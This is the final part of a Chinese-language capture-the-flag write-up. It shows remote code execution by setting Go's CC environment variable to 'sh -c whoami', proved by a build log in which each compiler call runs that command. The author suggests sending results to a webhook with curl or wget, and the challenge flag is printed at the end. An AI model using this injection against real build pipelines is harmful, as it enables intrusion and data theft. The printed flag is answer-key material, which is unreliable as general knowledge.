sh -c whoami -fdebug-prefix-map=a=b -c -x c - -o /dev/null || true
sh -c whoami -gno-record-gcc-switches -c -x c - -o /dev/null || true
cd $WORK/b041
TERM='dumb' sh -c whoami -I /usr/lib/go-1.18/src/runtime/cgo -fPIC -m64 -pthread -fno-caret-diagnostics -Qunused-arguments -fmessage-length=0 -fdebug-prefix-map=$WORK/b041=/tmp/go-build -gno-record-gcc-switches -I ./ -g -O2 -Wall -Werror -fdebug-prefix-map=/usr/lib/go-1.18/src/runtime/cgo=/_/runtime/cgo -o ./_x001.o -c _cgo_export.c
TERM='dumb' sh -c whoami -I /usr/lib/go-1.18/src/runtime/cgo -fPIC -m64 -pthread -fno-caret-diagnostics -Qunused-arguments -fmessage-length=0 -fdebug-prefix-map=$WORK/b041=/tmp/go-build -gno-record-gcc-switches -I ./ -g -O2 -Wall -Werror -fdebug-prefix-map=/usr/lib/go-1.18/src/runtime/cgo=/_/runtime/cgo -o ./_x002.o -c cgo.cgo2.c
cd /usr/lib/go-1.18/src/runtime/cgo
TERM='dumb' sh -c whoami -I . -fPIC -m64 -pthread -fno-caret-diagnostics -Qunused-arguments -fmessage-length=0 -fdebug-prefix-map=$WORK/b041=/tmp/go-build -gno-record-gcc-switches -I $WORK/b041/ -g -O2 -Wall -Werror -fdebug-prefix-map=/usr/lib/go-1.18/src/runtime/cgo=/_/runtime/cgo -o $WORK/b041/_x003.o -c gcc_context.c
TERM='dumb' sh -c whoami -I . -fPIC -m64 -pthread -fno-caret-diagnostics -Qunused-arguments -fmessage-length=0 -fdebug-prefix-map=$WORK/b041=/tmp/go-build -gno-record-gcc-switches -I $WORK/b041/ -g -O2 -Wall -Werror -fdebug-prefix-map=/usr/lib/go-1.18/src/runtime/cgo=/_/runtime/cgo -o $WORK/b041/_x004.o -c gcc_fatalf.c
TERM='dumb' sh -c whoami -I . -fPIC -m64 -pthread -fno-caret-diagnostics -Qunused-arguments -fmessage-length=0 -fdebug-prefix-map=$WORK/b041=/tmp/go-build -gno-record-gcc-switches -I $WORK/b041/ -g -O2 -Wall -Werror -fdebug-prefix-map=/usr/lib/go-1.18/src/runtime/cgo=/_/runtime/cgo -o $WORK/b041/_x005.o -c gcc_libinit.c
TERM='dumb' sh -c whoami -I . -fPIC -m64 -pthread -fno-caret-diagnostics -Qunused-arguments -fmessage-length=0 -fdebug-prefix-map=$WORK/b041=/tmp/go-build -gno-record-gcc-switches -I $WORK/b041/ -g -O2 -Wall -Werror -fdebug-prefix-map=/usr/lib/go-1.18/src/runtime/cgo=/_/runtime/cgo -o $WORK/b041/_x006.o -c gcc_linux_amd64.c
TERM='dumb' sh -c whoami -I . -fPIC -m64 -pthread -fno-caret-diagnostics -Qunused-arguments -fmessage-length=0 -fdebug-prefix-map=$WORK/b041=/tmp/go-build -gno-record-gcc-switches -I $WORK/b041/ -g -O2 -Wall -Werror -fdebug-prefix-map=/usr/lib/go-1.18/src/runtime/cgo=/_/runtime/cgo -o $WORK/b041/_x007.o -c gcc_mmap.c
TERM='dumb' sh -c whoami -I . -fPIC -m64 -pthread -fno-caret-diagnostics -Qunused-arguments -fmessage-length=0 -fdebug-prefix-map=$WORK/b041=/tmp/go-build -gno-record-gcc-switches -I $WORK/b041/ -g -O2 -Wall -Werror -fdebug-prefix-map=/usr/lib/go-1.18/src/runtime/cgo=/_/runtime/cgo -o $WORK/b041/_x008.o -c gcc_setenv.c
TERM='dumb' sh -c whoami -I . -fPIC -m64 -pthread -fno-caret-diagnostics -Qunused-arguments -fmessage-length=0 -fdebug-prefix-map=$WORK/b041=/tmp/go-build -gno-record-gcc-switches -I $WORK/b041/ -g -O2 -Wall -Werror -fdebug-prefix-map=/usr/lib/go-1.18/src/runtime/cgo=/_/runtime/cgo -o $WORK/b041/_x009.o -c gcc_sigaction.c
TERM='dumb' sh -c whoami -I . -fPIC -m64 -pthread -fno-caret-diagnostics -Qunused-arguments -fmessage-length=0 -fdebug-prefix-map=$WORK/b041=/tmp/go-build -gno-record-gcc-switches -I $WORK/b041/ -g -O2 -Wall -Werror -fdebug-prefix-map=/usr/lib/go-1.18/src/runtime/cgo=/_/runtime/cgo -o $WORK/b041/_x010.o -c gcc_traceback.c
TERM='dumb' sh -c whoami -I . -fPIC -m64 -pthread -fno-caret-diagnostics -Qunused-arguments -fmessage-length=0 -fdebug-prefix-map=$WORK/b041=/tmp/go-build -gno-record-gcc-switches -I $WORK/b041/ -g -O2 -Wall -Werror -fdebug-prefix-map=/usr/lib/go-1.18/src/runtime/cgo=/_/runtime/cgo -o $WORK/b041/_x011.o -c gcc_util.c
TERM='dumb' sh -c whoami -I . -fPIC -m64 -pthread -fno-caret-diagnostics -Qunused-arguments -fmessage-length=0 -fdebug-prefix-map=$WORK/b041=/tmp/go-build -gno-record-gcc-switches -I $WORK/b041/ -g -O2 -Wall -Werror -fdebug-prefix-map=/usr/lib/go-1.18/src/runtime/cgo=/_/runtime/cgo -o $WORK/b041/_x012.o -c linux_syscall.c
TERM='dumb' sh -c whoami -I . -fPIC -m64 -pthread -fno-caret-diagnostics -Qunused-arguments -fmessage-length=0 -fdebug-prefix-map=$WORK/b041=/tmp/go-build -gno-record-gcc-switches -I $WORK/b041/ -g -O2 -Wall -Werror -fdebug-prefix-map=/usr/lib/go-1.18/src/runtime/cgo=/_/runtime/cgo -o $WORK/b041/_x013.o -c gcc_amd64.S
cd $WORK/b041
TERM='dumb' sh -c whoami -I /usr/lib/go-1.18/src/runtime/cgo -fPIC -m64 -pthread -fno-caret-diagnostics -Qunused-arguments -fmessage-length=0 -fdebug-prefix-map=$WORK/b041=/tmp/go-build -gno-record-gcc-switches -I ./ -g -O2 -Wall -Werror -fdebug-prefix-map=/usr/lib/go-1.18/src/runtime/cgo=/_/runtime/cgo -o ./_cgo_main.o -c _cgo_main.c
cd /home/naup/Desktop/dist
TERM='dumb' sh -c whoami -I /usr/lib/go-1.18/src/runtime/cgo -fPIC -m64 -pthread -fno-caret-diagnostics -Qunused-arguments -fmessage-length=0 -fdebug-prefix-map=$WORK/b041=/tmp/go-build -gno-record-gcc-switches -o $WORK/b041/_cgo_.o $WORK/b041/_cgo_main.o $WORK/b041/_x001.o $WORK/b041/_x002.o $WORK/b041/_x003.o $WORK/b041/_x004.o $WORK/b041/_x005.o $WORK/b041/_x006.o $WORK/b041/_x007.o $WORK/b041/_x008.o $WORK/b041/_x009.o $WORK/b041/_x010.o $WORK/b041/_x011.o $WORK/b041/_x012.o $WORK/b041/_x013.o -g -O2 -lpthread
# runtime/cgo
naup
TERM='dumb' /usr/lib/go-1.18/pkg/tool/linux_amd64/cgo -dynpackage cgo -dynimport $WORK/b041/_cgo_.o -dynout $WORK/b041/_cgo_import.go -dynlinker
# runtime/cgo
naup
# runtime/cgo
naup
# runtime/cgo
naup
# runtime/cgo
naup
# runtime/cgo
naup
# runtime/cgo
naup
# runtime/cgo
naup
# runtime/cgo
naup
# runtime/cgo
naup
# runtime/cgo
naup
# runtime/cgo
naup
# runtime/cgo
naup
# runtime/cgo
naup
# runtime/cgo
naup
# runtime/cgo
cgo: cannot parse $WORK/b041/_cgo_.o as ELF, Mach-O, PE or XCOFF
```
	
成功RCE，接下來就用curl 或 wget的方式將結果送到webhook就可以解了!
其實 golang官網有提到CC這個環境變數相關資料
![golang-official-cc](img/go_official.png)

你是優秀的mygo工讀生

> Flag: THJCC{MyGo!!!\!!https://www.youtube.com/channel/UC80p_16pSSHA8YmtCVdX51w_OuO_ItsMygo!!!!!🎤🎸🎸🥁🎸GolangsFuneral🎹}